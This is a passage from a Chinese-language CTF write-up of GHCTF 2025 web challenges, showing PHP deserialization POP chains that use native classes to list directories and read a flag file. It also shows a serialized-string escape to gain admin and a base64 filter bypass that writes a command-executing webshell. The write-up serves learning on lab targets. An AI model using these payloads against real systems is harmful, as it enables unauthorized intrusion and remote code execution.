class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要考察的php的原生类的反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 很像下面的：</span></span><br><span class="line"><span class="variable">$day3</span> = <span class="keyword">new</span> <span class="title class_">DircetoryIterator</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$day4</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子构造在上面源码里面。</p><p>接着说一下<code>md5(md5($this-&gt;fruit11)) == 666</code>，如何构造<code>fruit11</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dict</span> <span class="keyword">as</span> <span class="variable">$a1</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dict</span> <span class="keyword">as</span> <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="variable">$temporary</span> = <span class="variable">$a1</span>.<span class="variable">$a2</span>; <span class="comment">// 这里也可以是3个字符，或者更多，只要爆破出来为两次md5变为等于666就可以。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$temporary</span>)) == <span class="number">666</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$temporary</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701193610527.png" class="" title="image-20250701193610527"><p>接着说一下array_walk函数:</p><img src="/CTFwp/GHCTF-2025/image-20250701194330890.png" class="" title="image-20250701194330890"><p>callback回调函数，将object中属性的键作为第二个参数，值作为第一个参数。</p><p><code>array_walk($this, function ($day1, $day2)</code>：</p><p>$this 表示 array_walk所在类的本身，如果我们要利用漏洞的话，就要添加一个属性:<code>public $DirectoryIterator=&#39;/&#39;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$DirectoryIterator</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;eS&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$My</span>= <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$Ph</span> = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$Ph</span> -&gt; fruit10 = <span class="variable">$My</span>;</span><br><span class="line"><span class="variable">$CB</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB</span> -&gt; fruit2 = <span class="variable">$Ph</span>;</span><br><span class="line"><span class="variable">$CB1</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB1</span> -&gt; fruit1 = <span class="variable">$CB</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$CB1</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701195759020.png" class="" title="image-20250701195759020"><p>通过DirectoryIterator类得到&#x2F;目录的文件名，再通过SplFileObject类查看内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SplFileObject</span> = <span class="string">&#x27;/flag44545615441084&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;eS&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$My</span>= <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$Ph</span> = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$Ph</span> -&gt; fruit10 = <span class="variable">$My</span>;</span><br><span class="line"><span class="variable">$CB</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB</span> -&gt; fruit2 = <span class="variable">$Ph</span>;</span><br><span class="line"><span class="variable">$CB1</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB1</span> -&gt; fruit1 = <span class="variable">$CB</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$CB1</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701195729122.png" class="" title="image-20250701195729122"><h2 id="Escape！"><a href="#Escape！" class="headerlink" title="Escape！"></a>Escape！</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小李写了个登陆网站，他不放心便加了个waf,殊不知这个waf不仅没让网站更安全反而给了黑客机会</span><br></pre></td></tr></table></figure><p>这个是题目描述，还有附件，下载一下附件。</p><p>waf.php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>); <span class="comment">// 这里会将上面的内容替换为error</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250702170021384.png" class="" title="image-20250702170021384"><p>表单的数据会进入login.php文件，我们接着看login.php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;db.php&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$SQL</span>=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$db</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,[<span class="variable">$username</span>]); <span class="comment">// 查询语句</span></span><br><span class="line"><span class="comment">// 由于使用的占位符，所以这里没有sql注入漏洞。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;用户不存在&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="comment">// 判断data是否存在</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="number">0</span>][<span class="string">&#x27;password&#x27;</span>]!==<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;密码错误&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$user</span>; <span class="comment">// 这里返回了一个User类的实例化对象。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setSignedCookie</span>(<span class="params"><span class="variable">$serializedData</span>, <span class="variable">$cookieName</span> = <span class="string">&#x27;user_token&#x27;</span>, <span class="variable">$secretKey</span> = <span class="string">&#x27;fake_secretKey&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$signature</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$serializedData</span>, <span class="variable">$secretKey</span>); <span class="comment">// 生成签名</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$signature</span>); <span class="comment">// 对签名和序列化数据进行签名</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookieName</span>, <span class="variable">$token</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 设置有效期为1小时</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$User</span>=<span class="title function_ invoke__">login</span>(<span class="variable">$SQL</span>,<span class="variable">$username</span>,<span class="variable">$password</span>); <span class="comment">// 调用上面的login函数，返回User类的实例化对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$User_ser</span>=<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$User</span>)); <span class="comment">// 这里可能会对序列化数据进行更改</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setSignedCookie</span>(<span class="variable">$User_ser</span>); <span class="comment">// 在这一步以及后序列化数据不会发生改变</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>); <span class="comment">// 重定向到dashboard.php</span></span><br></pre></td></tr></table></figure><p>dashboard.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSignedCookie</span>(<span class="params"><span class="variable">$cookieName</span> = <span class="string">&#x27;user_token&#x27;</span>, <span class="variable">$secretKey</span> = <span class="string">&#x27;fake_secretkey&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Cookie 内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$cookieName</span>])) &#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="variable">$cookieName</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解码并分割数据和签名</span></span><br><span class="line">        <span class="variable">$decodedToken</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$serializedData</span>, <span class="variable">$providedSignature</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$decodedToken</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新计算签名</span></span><br><span class="line">        <span class="variable">$calculatedSignature</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$serializedData</span>, <span class="variable">$secretKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较签名是否一致</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$calculatedSignature</span> === <span class="variable">$providedSignature</span>) &#123;</span><br><span class="line">            <span class="comment">// 签名验证通过，返回序列化的数据</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$serializedData</span>;  <span class="comment">// 反序列化数据</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 签名验证失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 如果没有 Cookie</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：验证并读取 Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>(); <span class="comment">// 序列化数据后面就没有变过，所以签名验证这一步肯定是可以过的。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123; <span class="comment">// 如果我们要写入文件的话，isadmin必须为true</span></span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token验证失败&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先在login.php页面注册一个用户，然后登录进去，拿到setcookie。</p><img src="/CTFwp/GHCTF-2025/image-20250702171432898.png" class="" title="image-20250702171432898"><p>我们现在需要isadmin为1。</p><p>前面waf那里就可以进行字符的增加和减少，感觉可以进行字符串逃逸。</p><p><code>&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>为21个字符，我选择的是<code>||</code>，<code>||</code>到error，相差3个字符，27除以3，为7，所以要输入7次||，再拼接”;s:7:”isadmin”;b:1;}就可以。</p><img src="/CTFwp/GHCTF-2025/image-20250702171918436.png" class="" title="image-20250702171918436"><p>在注册表的用户名输入我们构造好的payload:<code>||||||||||||||&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，密码随便输，注册完后，接着登录就可以进入下图所在的页面。</p><img src="/CTFwp/GHCTF-2025/image-20250702172030850.png" class="" title="image-20250702172030850"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是死亡绕过了。<br>我们输入的内容为:base64加密的内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码：4字节变为3字节，<code>&lt;?php exit; ?&gt;</code>，有效字符只有phpexit七个字符，只有8个字符才能有效解码，所以这里我们再随机添加一个字符，就可以成功解码。</p><img src="/CTFwp/GHCTF-2025/image-20250702172952107.png" class="" title="image-20250702172952107"><p>a 是我随便加的。</p><img src="/CTFwp/GHCTF-2025/image-20250702173132577.png" class="" title="image-20250702173132577"><p>最后拿flag。</p><img src="/CTFwp/GHCTF-2025/image-20250702173145120.png" class="" title="image-20250702173145120"><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p>下载附件，进行代码审计：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>): <span class="comment"># file waf</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> 